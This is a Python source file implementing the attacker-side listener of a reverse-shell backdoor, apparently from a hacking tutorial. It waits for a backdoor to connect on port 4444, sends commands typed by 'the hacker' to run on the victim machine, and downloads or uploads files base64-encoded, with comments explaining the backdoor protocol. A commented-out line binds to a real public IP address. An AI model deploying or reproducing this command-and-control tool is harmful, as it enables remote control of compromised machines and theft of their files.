#!/usr/share/python3

import socket
import json
import base64

# Listner Program

#listner = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#listner.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)        # setting the attribute of socket.SO_REUSEADDR of layer socket.SOL_SOCKET to 1 
#listner.bind(("64.227.138.246", 4444))                               # binding the listner to our own IP and Port
#listner.listen(0)                                                    # .listen(backlog) //// backlog refers to the number of connections queue to be held before it starts to refuse connections
#print("[+] Waiting for incomming connections .... ")
#connection, address = listner.accept()                               # listner.accept() will return two values, connection will be an object that is similar to the connection
                                                                      # obect used in earlier programs. address will contain the value of address from which the connection is recieved
#print("[+] Connection recieved from " + str(address))

#while True:
#    command = input(">> ")
#    connection.send(command)
#    result = connection.recv(1024)
#    print(result)

class Listner():
    def __init__(self, ip_address, port):    
        listner = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listner.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)        # setting the attribute of socket.SO_REUSEADDR of layer socket.SOL_SOCKET to 1 
        listner.bind((ip_address, port))                                     # binding the listner to our own IP and Port
        listner.listen(0)                                                    # .listen(backlog) //// backlog refers to the number of connections queue to be held before it starts to refuse connections
        print("[+] Waiting for incomming connections .... ")
        self.connection, address = listner.accept()                          # listner.accept() will return two values, connection will be an object that is similar to the connection
                                                                             # obect used in earlier programs. address will contain the value of address from which the connection is recieved
        print("[+] Connection recieved from " + str(address))

    def reliable_send(self, data):                                           # It will convert the data into json format and send it to desired location
        json_data = json.dumps(data)                                         # json.dumps encodes the data in json format
        self.connection.send(json_data.encode())                             

    #def reliable_receive(self):                                             # It will recieve the json format data and decode it to normal form of data
    #    json_data = self.connection.recv(1024)                               
    #    return json.loads(json_data)                                        # json.loads decodes the json data in normal format

    def reliable_receive(self):                         
        while True:                                                          # Start a infinite loop
            json_data = b""                                                  # Initialize the variable json_data to a empty string (b for converting the string into byte like object)
            try:                                                             # Try to run the given code
                json_data = json_data + self.connection.recv(1024)           # json_data + the recieved connection
                return json.loads(json_data)                                 # return the json_data value
            except ValueError:                                               # Except a ValueError occurs, execute the following code
                continue                                                     # continue to the code (In this case it will get back in the loop and whill try to recieve more data)

    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()

        return self.reliable_receive()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))                            # Base64 decode the data as the backdoor is going to encode it 
            return "[+] Download successful."

    def read_file(self, path):
        with open(path, "rb") as file:                                       # Read the file as binary
            return base64.b64encode(file.read())                             # Base64 encoding the file to avoid Bad characters in file that will throw error in json packing [UnicodeDecodeError]

    def run(self):
        while True:
            command = input(">> ")
            command = command.split(" ")                                     # Split the command on the basis of " " (space) and store it in command variable as a list
            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1])                # Read the file that was specified in the 2nd element of the list
                    command.append(file_content)                             # append the list with the content of the file
                result = self.execute_remotely(command) 
                if command[0] == "download" and "[-] Error" not in result:
                    result = self.write_file(command[1], result)
            except Exception:
                result = "[-] Error during command execution."
            
            print(result)

# Classes can be called in the same function too

listner = Listner("10.0.2.1", 4444)
listner.run()

# The lister must have more functions like exit and download and upload as well as change directory functions. 
# To implement this, the command that will be entered by the hacker in the listener will be segregated into two parts. 
# First word will be a arguement and rest of all will be command
# The string that the hacker entered will be seperated into parts on the basis of spaces and if the first word is something like "exit", it will be considered as an arguement
# and the particular function for the arguement will be applied. (exit arguement in this case will exit the program)

# //// UPLOAD FUNCTIONALITY ////
# command list usually contains ["instruction", "command"]
# command list for downloading contained ["download", "path"]
# In uploads, command list will contian ["upload", "path", "content"]
# Hence, first user will enter ["upload", "path"]
# The file in the path (command[1]) will be opened and read
# read content will be stored in command[2] (3rd element of the list)
# This list of 3 elements will be sent to the backdoor
# backdoor will take the command[0] == "upload"
# command[1] == "path" (It will get the file name from here)
# command[2] == "content" (It will write it in given file)
# upload complete!
